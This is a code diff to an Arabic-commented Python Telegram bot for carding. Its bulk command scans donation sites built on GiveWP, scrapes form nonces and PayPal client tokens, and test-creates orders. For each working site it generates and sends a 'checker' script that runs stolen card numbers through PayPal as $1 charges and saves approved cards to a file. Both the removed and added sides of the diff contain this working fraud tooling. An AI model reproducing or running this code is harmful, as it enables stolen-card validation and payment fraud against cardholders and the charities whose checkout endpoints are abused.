@@ -768,7 +768,7 @@ Dev: @nnunrr''',
         )
     os.remove(file_name)
 
-# ============ ميزة سحب من ملف مع عداد ============
+# ============ ميزة سحب من ملف مع عداد وارسال فوري ============
 @bot.message_handler(commands=['bulk'])
 def bulk_extract_start(message):
     with open("blockusers.txt", "r") as file:
@@ -805,7 +805,8 @@ def process_bulk_file(message):
             'processed': 0,
             'live': 0,
             'dead': 0,
-            'lock': threading.Lock()
+            'lock': threading.Lock(),
+            'running': True
         }
         
         status_msg = bot.reply_to(message, f"""📊 <b>جاري فحص الروابط...</b>
@@ -817,296 +818,149 @@ def process_bulk_file(message):
 ━━━━━━━━━━━━━━━━━━
 ⏱️ جاري المعالجة...""", parse_mode="HTML")
         
-        # دالة فحص الرابط
-        def check_link(link, index):
+        # دالة فحص الرابط وإرساله فوراً
+        def check_and_send(link, index):
+            if not processing_status.get(user_id, {}).get('running', False):
+                return
+            
             try:
                 if not link.startswith(("http://", "https://")):
-                    return None
+                    with processing_status[user_id]['lock']:
+                        processing_status[user_id]['processed'] += 1
+                        processing_status[user_id]['dead'] += 1
+                    return
                 
-                # فحص سريع
-                r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=8)
+                # فحص سريع - مهلة 5 ثواني بس
+                r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
                 if r.status_code != 200:
-                    return None
+                    with processing_status[user_id]['lock']:
+                        processing_status[user_id]['processed'] += 1
+                        processing_status[user_id]['dead'] += 1
+                    return
                 
                 res = r.text
-                # البحث عن البيانات المطلوبة
-                id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
-                id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res)
-                nonec = re.search(r'name="give-form-hash" value="(.*?)"', res)
+                id1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
+                id2 = re.search(r'name="give-form-id" value="(.*?)"', res)
+                nonce = re.search(r'name="give-form-hash" value="(.*?)"', res)
                 anc = re.search(r'"data-client-token":"(.*?)"', res)
                 
-                if not all([id_form1, id_form2, nonec, anc]):
-                    return None
+                if not all([id1, id2, nonce, anc]):
+                    with processing_status[user_id]['lock']:
+                        processing_status[user_id]['processed'] += 1
+                        processing_status[user_id]['dead'] += 1
+                    return
                 
-                id_form1 = id_form1.group(1)
-                id_form2 = id_form2.group(1)
-                nonec = nonec.group(1)
-                enc = anc.group(1)
-                dec = base64.b64decode(enc).decode('utf-8')
-                au = re.search(r'"accessToken":"(.*?)"', dec)
+                au = re.search(r'"accessToken":"(.*?)"', base64.b64decode(anc.group(1)).decode())
                 if not au:
-                    return None
+                    with processing_status[user_id]['lock']:
+                        processing_status[user_id]['processed'] += 1
+                        processing_status[user_id]['dead'] += 1
+                    return
                 au = au.group(1)
                 
+                # التحقق النهائي
                 parsed = urlparse(link)
-                USER_URL2 = f'https://{parsed.netloc}'
-                USER_URL = parsed.path
-                
-                # محاولة استخراج token
-                headers = {
-                    'origin': f'{USER_URL2}',
-                    'referer': f'{USER_URL}',
-                    'user-agent': 'Mozilla/5.0',
-                    'x-requested-with': 'XMLHttpRequest',
-                }
-                
-                data = MultipartEncoder({
-                    'give-form-id-prefix': (None, id_form1),
-                    'give-form-id': (None, id_form2),
-                    'give-form-hash': (None, nonec),
-                    'give-amount': (None, '1.00'),
+                d = MultipartEncoder({
+                    'give-form-id-prefix': (None, id1.group(1)),
+                    'give-form-id': (None, id2.group(1)),
+                    'give-form-hash': (None, nonce.group(1)),
+                    'give-amount': (None, '1'),
                     'payment-mode': (None, 'paypal-commerce'),
                     'give_first': (None, 'Test'),
                     'give_last': (None, 'User'),
-                    'give_email': (None, 'test@gmail.com'),
+                    'give_email': (None, 'x@gmail.com'),
                     'give-gateway': (None, 'paypal-commerce'),
                 })
-                
-                headers['content-type'] = data.content_type
-                params = {'action': 'give_paypal_commerce_create_order'}
-                
-                response = requests.post(f'{USER_URL2}/wp-admin/admin-ajax.php', params=params, headers=headers, data=data, timeout=10)
-                if response.status_code != 200:
-                    return None
-                response_json = response.json()
-                if 'data' not in response_json or 'id' not in response_json['data']:
-                    return None
-                
-                # الرابط شغال ✅
-                return {
-                    'link': link,
-                    'id_form1': id_form1,
-                    'id_form2': id_form2,
-                    'nonec': nonec,
-                    'au': au,
-                    'url': USER_URL2,
-                    'path': USER_URL
-                }
-            except:
-                return None
-        
-        # استخدام ThreadPoolExecutor للسرعة
-        live_data = []
-        with ThreadPoolExecutor(max_workers=10) as executor:
-            futures = []
-            for i, link in enumerate(links, 1):
-                future = executor.submit(check_link, link, i)
-                futures.append((future, i, link))
-            
-            for future, i, link in futures:
-                try:
-                    result = future.result(timeout=15)
+                resp = requests.post(
+                    f"https://{parsed.netloc}/wp-admin/admin-ajax.php",
+                    params={'action': 'give_paypal_commerce_create_order'},
+                    headers={'content-type': d.content_type},
+                    data=d,
+                    timeout=5
+                )
+                if resp.status_code != 200 or 'id' not in resp.json().get('data', {}):
                     with processing_status[user_id]['lock']:
                         processing_status[user_id]['processed'] += 1
-                        if result:
-                            processing_status[user_id]['live'] += 1
-                            live_data.append(result)
-                        else:
-                            processing_status[user_id]['dead'] += 1
-                        
-                        # تحديث التقدم
-                        processed = processing_status[user_id]['processed']
-                        live = processing_status[user_id]['live']
-                        dead = processing_status[user_id]['dead']
-                        progress = int((processed / total) * 100)
-                        
-                        if processed % 5 == 0 or processed == total:
-                            bar_length = 20
-                            filled = int((progress / 100) * bar_length)
-                            bar = '█' * filled + '░' * (bar_length - filled)
-                            
-                            text = f"""📊 <b>جاري فحص الروابط...</b>
+                        processing_status[user_id]['dead'] += 1
+                    return
+                
+                # الرابط حي ✅ - نبعت الملف فوراً!
+                code = f'''import requests,re,base64
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+from urllib.parse import urlparse
+class P:
+ def __init__(s):
+  s.id1="{id1.group(1)}";s.id2="{id2.group(1)}";s.nonce="{nonce.group(1)}";s.au="{au}";s.url=urlparse('{link}').netloc
+ def charge(s,c):
+  c=c.split('|');n=c[0];mm=c[1];yy=c[2];cvc=c[3].strip()
+  if '20' in yy: yy=yy.split('20')[1]
+  d=MultipartEncoder({{'give-form-id-prefix':(None,s.id1),'give-form-id':(None,s.id2),'give-form-hash':(None,s.nonce),'give-amount':(None,'1'),'payment-mode':(None,'paypal-commerce'),'give_first':(None,'Test'),'give_last':(None,'User'),'give_email':(None,'x@gmail.com'),'give-gateway':(None,'paypal-commerce')}})
+  r3=requests.post(f'https://{{s.url}}/wp-admin/admin-ajax.php',params={{'action':'give_paypal_commerce_create_order'}},headers={{'content-type':d.content_type}},data=d).json()['data']['id']
+  requests.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source',headers={{'authorization':f'Bearer {{s.au}}'}},json={{"payment_source":{{"card":{{"number":n,"expiry":f"20{{yy}}-{{mm}}","security_code":cvc}}}}}})
+  r5=requests.post(f'https://{{s.url}}/wp-admin/admin-ajax.php',params={{'action':'give_paypal_commerce_approve_order','order':r3}},headers={{'content-type':d.content_type}},data=d)
+  return 'CHARGE' if 'true' in r5.text else 'FAIL'
+if __name__=="__main__": print(P().charge(input('Card: ')))'''
+                
+                f = f'g_{user_id}_{index}_{int(time.time())}.py'
+                open(f, 'w').write(code)
+                bot.send_document(chat_id, open(f, 'rb'), caption=f"✅ Live #{index}\n{link[:50]}")
+                os.remove(f)
+                
+                with processing_status[user_id]['lock']:
+                    processing_status[user_id]['processed'] += 1
+                    processing_status[user_id]['live'] += 1
+                    
+            except Exception as e:
+                with processing_status[user_id]['lock']:
+                    processing_status[user_id]['processed'] += 1
+                    processing_status[user_id]['dead'] += 1
+            
+            # تحديث التقدم
+            try:
+                with processing_status[user_id]['lock']:
+                    processed = processing_status[user_id]['processed']
+                    live = processing_status[user_id]['live']
+                    dead = processing_status[user_id]['dead']
+                    prog = int((processed / total) * 100) if total > 0 else 0
+                
+                if processed % 10 == 0 or processed == total:
+                    bar = '█' * (prog // 5) + '░' * (20 - (prog // 5))
+                    text = f"""📊 <b>جاري فحص الروابط...</b>
 ━━━━━━━━━━━━━━━━━━
 📌 إجمالي الروابط: {total}
 ✅ شغالة: {live}
 ❌ ميتة: {dead}
-⏳ التقدم: {progress}% {bar}
+⏳ التقدم: {prog}% {bar}
 ━━━━━━━━━━━━━━━━━━
 ⏱️ تم فحص {processed} من {total}"""
-                            
-                            try:
-                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
-                            except:
-                                pass
+                    try:
+                        bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
+                    except:
+                        pass
+            except:
+                pass
+        
+        # تشغيل الفحص المتوازي - 30 عامل عشان السرعة
+        with ThreadPoolExecutor(max_workers=30) as executor:
+            futures = []
+            for i, link in enumerate(links, 1):
+                if not processing_status.get(user_id, {}).get('running', False):
+                    break
+                future = executor.submit(check_and_send, link, i)
+                futures.append(future)
+                # تأخير بسيط عشان الموقع ميحظرش
+                time.sleep(0.03)
+            
+            # نستنى كل الفيوتشرز تخلص
+            for future in futures:
+                try:
+                    future.result(timeout=30)
                 except:
-                    with processing_status[user_id]['lock']:
-                        processing_status[user_id]['processed'] += 1
-                        processing_status[user_id]['dead'] += 1
+                    pass
         
         # النتيجة النهائية
-        status = processing_status[user_id]
-        
-        # إرسال كل رابط حي كملف Python
-        if live_data:
-            for idx, data in enumerate(live_data, 1):
-                code = f'''import requests, re, random, time, base64
-from fake_useragent import UserAgent
-from requests_toolbelt.multipart.encoder import MultipartEncoder
-from urllib.parse import urlparse
-
-class PayPal:
-    def __init__(self):
-        self.first_name = ["James", "John", "Robert", "Michael", "William"]
-        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
-        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
-        self.donation = "1.00"
-        self.id_form1 = "{data['id_form1']}"
-        self.id_form2 = "{data['id_form2']}"
-        self.nonec = "{data['nonec']}"
-        self.au = "{data['au']}"
-        url = '{data['link']}'
-        parsed = urlparse(url)
-        self.url = parsed.netloc
-        self.inurl = parsed.path
-        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
-        self.r = requests.Session()
-        self.uu = UserAgent()
-        self.checked = 0
-
-    def Key(self):
-        return self.au, self.id_form1, self.id_form2, self.nonec
-
-    def Charge(self, ccx):
-        self.checked += 1
-        ccx = ccx.strip()
-        n = ccx.split("|")[0]
-        mm = ccx.split("|")[1]
-        yy = ccx.split("|")[2]
-        cvc = ccx.split("|")[3].strip()
-        if "20" in yy:
-            yy = yy.split("20")[1]
-        
-        da2 = MultipartEncoder({{
-            'give-form-id-prefix': (None, self.id_form1),
-            'give-form-id': (None, self.id_form2),
-            'give-form-hash': (None, self.nonec),
-            'give-amount': (None, self.donation),
-            'payment-mode': (None, 'paypal-commerce'),
-            'give_first': (None, random.choice(self.first_name)),
-            'give_last': (None, random.choice(self.last_name)),
-            'give_email': (None, self.email),
-            'give-gateway': (None, 'paypal-commerce'),
-        }})
-        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
-        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
-        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']
-
-        he4 = {{
-            'authorization': f'Bearer {{self.au}}',
-            'paypal-client-metadata-id': self.paypal,
-            'user-agent': self.uu.random,
-        }}
-        da3 = {{
-            'payment_source': {{
-                'card': {{
-                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
-                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
-                }},
-            }},
-            'application_context': {{'vault': False}},
-        }}
-        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)
-
-        da4 = MultipartEncoder({{
-            'give-form-id-prefix': (None, self.id_form1),
-            'give-form-id': (None, self.id_form2),
-            'give-form-hash': (None, self.nonec),
-            'give-amount': (None, self.donation),
-            'payment-mode': (None, 'paypal-commerce'),
-            'give_first': (None, random.choice(self.first_name)),
-            'give_last': (None, random.choice(self.last_name)),
-            'give_email': (None, self.email),
-            'give-gateway': (None, 'paypal-commerce'),
-        }})
-        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
-        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
-        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
-        
-        text = r5.text
-        if 'true' in text: return 'CHARGE 1.00$'
-        elif 'INSUFFICIENT_FUNDS' in text: return "INSUFFICIENT_FUNDS"
-        elif 'ORDER_NOT_APPROVED' in text: return "ORDER_NOT_APPROVED"
-        else:
-            try: return r5.json()['data']['error']
-            except: return "UNKNOWN_ERROR"
-
-if __name__ == '__main__':
-    Getat = 'PayPal Custom 1$'
-    print(f'Cheker {{Getat}}')
-    print('━' * 30)
-    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
-    if Br == '1':
-        try:
-            while True:
-                ar = input('Enter Card ( n | mm | yy | cvc ): ')
-                rr = PayPal()
-                itt = rr.Key()
-                resulti = rr.Charge(ar)
-                if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
-                    with open('Approved Card.txt', "a") as f:
-                        f.write(ar + f': {{resulti}} > {{Getat}}')
-                print(f'[{{rr.checked}}] ' + ar + '  >>  ' + resulti)
-                time.sleep(1)
-        except:
-            pass
-    else:
-        noy = 0
-        live = 0
-        dead = 0
-        cr = input('Enter Name Combo: ')
-        with open(cr, "r") as f:
-            crads = f.read().splitlines()
-            print('Wait Checking Your Card ...')
-            print('━' * 30)
-            for P in crads:
-                noy += 1
-                try:
-                    rr = PayPal()
-                    itt = rr.Key()
-                    resulti = rr.Charge(P)
-                    if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
-                        live += 1
-                        with open('Approved Card.txt', "a") as f:
-                            f.write(P + ': {{resulti}} > {{Getat}}')
-                    else:
-                        dead += 1
-                except:
-                    resulti = 'Error'
-                    dead += 1
-                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
-                time.sleep(1)
-            print('━' * 30)
-            print(f'Total: {{noy}} | Live: {{live}} | Dead: {{dead}}')
-            print('━' * 30)'''
-                
-                file_name = f'gateway_{idx}_{user_id}.py'
-                with open(file_name, 'w', encoding='utf-8') as f:
-                    f.write(code)
-                with open(file_name, 'rb') as f:
-                    bot.send_document(
-                        chat_id,
-                        f,
-                        caption=f"""✅ <b>Gateway #{idx}</b>
-━━━━━━━━━━━━━━━━━━━━
-🔗 Link: <code>{data['link']}</code>
-━━━━━━━━━━━━━━━━━━━━
-Dev: @nnunrr""",
-                        parse_mode="HTML"
-                    )
-                os.remove(file_name)
-                time.sleep(0.3)
-            
-            # النتيجة النهائية
+        if user_id in processing_status:
+            status = processing_status[user_id]
             final_text = f"""📊 <b>✅ Bulk Extraction Complete!</b>
 ━━━━━━━━━━━━━━━━━━━━
 📌 Total Links: {status['total']}
@@ -1115,19 +969,10 @@ Dev: @nnunrr""",
 💯 Success Rate: {int((status['live']/status['total'])*100) if status['total'] > 0 else 0}%
 ━━━━━━━━━━━━━━━━━━━━
 Dev: @nnunrr"""
-            bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="HTML")
-        else:
-            no_live_text = f"""📊 <b>❌ No live links found!</b>
-━━━━━━━━━━━━━━━━━━━━
-📌 Total Links: {status['total']}
-✅ Live: 0
-❌ Dead: {status['dead']}
-━━━━━━━━━━━━━━━━━━━━
-Dev: @nnunrr"""
-            bot.edit_message_text(no_live_text, chat_id, status_msg.message_id, parse_mode="HTML")
-        
-        # تنظيف
-        if user_id in processing_status:
+            try:
+                bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="HTML")
+            except:
+                bot.send_message(chat_id, final_text, parse_mode="HTML")
             del processing_status[user_id]
             
     except Exception as e:
